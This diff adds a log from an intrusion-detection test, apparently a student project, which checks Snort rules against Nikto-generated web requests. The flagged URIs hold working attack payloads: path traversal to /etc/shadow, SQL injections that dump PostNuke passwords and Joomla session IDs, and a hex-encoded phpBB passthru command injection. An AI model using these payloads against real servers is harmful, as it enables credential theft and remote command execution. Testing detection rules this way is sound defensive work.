@@ -1,0 +1,34 @@
+# inspectorlog v3.5
+#----- Initializing Rules (SNORT) ---------------------
+# Rules directory : "/home/kali/Downloads/reglas_javi/snort"
+#	Opening SNORT rule file /home/kali/Downloads/reglas_javi/snort/http_uri-sn-20220324.rules... done
+#		Rules: read [3749], erroneous [0], URI [384]
+#	Opening SNORT rule file /home/kali/Downloads/reglas_javi/snort/http_uri-er-20220224.rules... done
+[parse_snortRule] WARNING: Line [4970] exceeds allowed number of PCRE fields
+#		Rules: read [6015], erroneous [0], URI [5116]
+#----- Statistics (SNORT) ------------------------------
+# Read [9764] Snort rules, [5500] http-related, [0] with errors
+#----- Analysis results ----------------------------
+# Alerts & signatures generated from: /home/kali/Downloads/inspectorlog/inspectorlog -l sql_injection.uri -r /home/kali/Downloads/reglas_javi/snort -t list -o /home/kali/TFG/inspectorlog/snort/conf_personalizada/web_estatica/owasp/opensource/nikto/sql_injection.clean
+Packet [495]	Uri [/web/tmUnblock.cgi]	Nattacks [1]	Signatures	[2018132]
+Packet [501]	Uri [/web/../../../../../../../../../../../../etc/shadow]	Nattacks [1]	Signatures	[2009485]
+Packet [528]	Uri [/web/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*]	Nattacks [5]	Signatures	[16431]	[2006445]	[2006446]	[2010963]	[2011042]
+Packet [529]	Uri [/web/postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*]	Nattacks [5]	Signatures	[16431]	[2006445]	[2006446]	[2010963]	[2011042]
+Packet [532]	Uri [/web/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*]	Nattacks [5]	Signatures	[16431]	[2006445]	[2006446]	[2010963]	[2011042]
+Packet [536]	Uri [/web/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [561]	Uri [/web/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [562]	Uri [/web/postnuke/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [563]	Uri [/web/postnuke/html/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [564]	Uri [/web/modules/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [565]	Uri [/web/phpBB/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [566]	Uri [/web/forum/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [570]	Uri [/web/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [595]	Uri [/web/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [596]	Uri [/web/postnuke/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [597]	Uri [/web/postnuke/html/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [598]	Uri [/web/modules/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [599]	Uri [/web/phpBB/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [600]	Uri [/web/forum/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527]	Nattacks [1]	Signatures	[2021390]
+Packet [615]	Uri [/web/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=75&type_id=1&list[select]=(select%201%20FROM(select%20count(*),concat((select%20(select%20concat(session_id))%20FROM%20jml_session%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)]	Nattacks [3]	Signatures	[2006445]	[2011042]	[2017808]
+# N. packets [626], [20] with alerts, N. Alerts [34]
+# Execution time: 0.202369 s
